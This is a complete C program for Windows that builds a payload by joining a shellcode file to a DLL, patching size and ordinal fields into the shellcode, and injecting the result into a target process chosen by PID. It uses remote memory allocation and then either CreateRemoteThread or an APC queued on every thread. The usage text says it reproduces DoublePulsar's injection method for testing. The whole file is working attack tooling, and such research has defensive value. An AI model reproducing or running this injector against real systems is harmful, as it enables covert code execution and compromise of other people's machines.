#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

typedef struct {
	LPBYTE lpbData;
	DWORD dwDataSize;
} BUFFER_WITH_SIZE;

typedef BUFFER_WITH_SIZE* PBUFFER_WITH_SIZE;

const SHELLC_DLL_SIZE_OFFSET = 0xf82;
const SHELLC_ORDINAL_OFFSET = 0xf86;


HANDLE hProcHeap;

void read_file(LPCSTR filename, PBUFFER_WITH_SIZE pBws)
{
	HANDLE hFile;
	LONGLONG llFileSize;
	LARGE_INTEGER liFileSize;
	DWORD dwBytesRead;
	DWORD dwTotalBytesRead;
	LPBYTE lpFileData;
	BOOL bResult;

	hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Could not open file %s\n", filename);
		exit(1);
	}

	bResult = GetFileSizeEx(hFile, &liFileSize);
	if (!bResult)
	{
		printf("Error getting size of file %s\n", filename);
		exit(1);
	}
	llFileSize = liFileSize.QuadPart;

	lpFileData = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, llFileSize);
	if (lpFileData == NULL)
	{
		printf("Error allocating memory\n");
		exit(1);
	}

	dwTotalBytesRead = 0;
	do
	{
		bResult = ReadFile(hFile, lpFileData + dwTotalBytesRead,
			llFileSize - dwTotalBytesRead, &dwBytesRead, NULL);
		dwTotalBytesRead += dwBytesRead;
	} while (!(bResult &&  dwBytesRead == 0) || !bResult);
	if (!bResult)
	{
		printf("Error reading file %s\n", filename);
		exit(1);
	}

	CloseHandle(hFile);

	pBws->lpbData = lpFileData;
	pBws->dwDataSize = llFileSize;
}

void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBUFFER_WITH_SIZE pBws)
{
	BUFFER_WITH_SIZE shellcode;
	BUFFER_WITH_SIZE dll;
	DWORD dwPayloadSize;
	LPBYTE lpbPayload;

	read_file(shellcode_file, &shellcode);
	read_file(dll_file, &dll);

	dwPayloadSize = shellcode.dwDataSize + dll.dwDataSize;

	lpbPayload = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, dwPayloadSize);
	if (lpbPayload == NULL)
	{
		printf("Error allocating memory\n");
		exit(1);
	}

	// Edit shellcode to include ordinal and shellcode size
	memcpy_s(shellcode.lpbData + SHELLC_DLL_SIZE_OFFSET,
		shellcode.dwDataSize - SHELLC_DLL_SIZE_OFFSET, &(dll.dwDataSize), sizeof(dwPayloadSize));
	memcpy_s(shellcode.lpbData + SHELLC_ORDINAL_OFFSET,
		shellcode.dwDataSize - SHELLC_ORDINAL_OFFSET, &ordinal, sizeof(ordinal));

	// Put it all together, shellcode + DLL
	memcpy_s(lpbPayload, dwPayloadSize, shellcode.lpbData, shellcode.dwDataSize);
	memcpy_s(lpbPayload + shellcode.dwDataSize, dwPayloadSize - shellcode.dwDataSize,
		dll.lpbData, dll.dwDataSize);

	if (shellcode.lpbData != NULL)
		HeapFree(hProcHeap, 0, shellcode.lpbData);
	if (dll.lpbData != NULL)
		HeapFree(hProcHeap, 0, dll.lpbData);

	pBws->lpbData = lpbPayload;
	pBws->dwDataSize = dwPayloadSize;
}

void inject(DWORD pid, BUFFER_WITH_SIZE payload, BOOL useCreateRemoteProcess)
{
	HANDLE hProc;
	LPVOID lpProcMem;
	BOOL bResult;
	SIZE_T dwBytesWritten;

	if (useCreateRemoteProcess)
	{
		// More access rights needed for CreateRemoteProcess
		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	}
	else
	{
		hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	}

	if (hProc == NULL)
	{
		printf("Error opening process\n");
		exit(1);
	}

	lpProcMem = VirtualAllocEx(hProc, NULL, payload.dwDataSize, MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (lpProcMem == NULL)
	{
		printf("Error allocating memory in target process\n");
		exit(1);
	}

	bResult = WriteProcessMemory(hProc, lpProcMem, payload.lpbData, payload.dwDataSize,
		&dwBytesWritten);
	if (!bResult)
	{
		printf("Error writing to process memory\n");
		exit(1);
	}


	if (useCreateRemoteProcess)
	{
		SECURITY_ATTRIBUTES secAtr;
		secAtr.nLength = sizeof(SECURITY_ATTRIBUTES);
		secAtr.bInheritHandle = FALSE;
		secAtr.lpSecurityDescriptor = NULL;
		CreateRemoteThread(hProc, &secAtr, 0, lpProcMem, NULL, 0, NULL);
	}
	else
	{
		// Find a threads in the target process

		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE)
		{
			printf("Error getting thread information\n");
			exit(1);
		}

		DWORD threadId = 0;
		THREADENTRY32 threadEntry;
		threadEntry.dwSize = sizeof(THREADENTRY32);

		bResult = Thread32First(hSnapshot, &threadEntry);
		while (bResult)
		{
			bResult = Thread32Next(hSnapshot, &threadEntry);
			if (bResult)
			{
				if (threadEntry.th32OwnerProcessID == pid)
				{
					threadId = threadEntry.th32ThreadID;

					// We inject into all threads, this makes it more likely one will fire the APC
					// but it may ruin more than once.
					// While this is not ideal, it serves for testing.

					printf("Using thread: %i\n", threadId);
					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
					if (hThread == NULL)
					{
						printf("Error opening thread, will continue to try any other threads...\n");
					}
					else
					{
						// Queue the APC
						DWORD dwResult = QueueUserAPC((PAPCFUNC)lpProcMem, hThread, 0);
						if (!dwResult)
						{
							printf("Error calling QueueUserAPC on thread, will continue to try any other threads...\n");
						}
						CloseHandle(hThread);
					}
				}
			}
		}

		if (!threadId)
		{
			printf("No threads found in target process\n");
		}

		CloseHandle(hSnapshot);
	}

	CloseHandle(hProc);
}


int main(int argc, char *argv[])
{
	BUFFER_WITH_SIZE payload;
	LPCSTR shellcode_file;
	LPCSTR dll_file;
	DWORD pid;
	DWORD ordinal;
	BOOL useCreateRemoteProcess;

	if (argc < 5)
	{
		printf("USAGE: <pid> <shellcode_file> <dll_to_inject> <ordinal_to_execute> [use_CreateRemoteProcess]\n");
		printf("\nThe last argument is optional, if specified 'true' then CreateRemoteProcess will be used instead of using an APC call which is the default way Doublepulsar works. This is to allow people to test it out in different ways.");
		printf("\nThe default is using APC. This will inject into ALL threads in the target, which makes it more likely one of them will trigger quickly. This is only suitable for testing as it may be undesirable to call the payload more than once.");
		exit(0);
	}

	pid = atol(argv[1]);
	shellcode_file = argv[2];
	dll_file = argv[3];
	ordinal = atol(argv[4]);
	useCreateRemoteProcess = FALSE;
	if (argc >= 6)
	{
		useCreateRemoteProcess = TRUE;
	}

	hProcHeap = GetProcessHeap();
	if (hProcHeap == NULL)
	{
		printf("Error allocating memory\n");
		exit(1);
	}

	construct_payload(shellcode_file, dll_file, ordinal, &payload);

	inject(pid, payload, useCreateRemoteProcess);

	if (payload.lpbData != NULL)
		HeapFree(hProcHeap, 0, payload.lpbData);

	return 0;
}
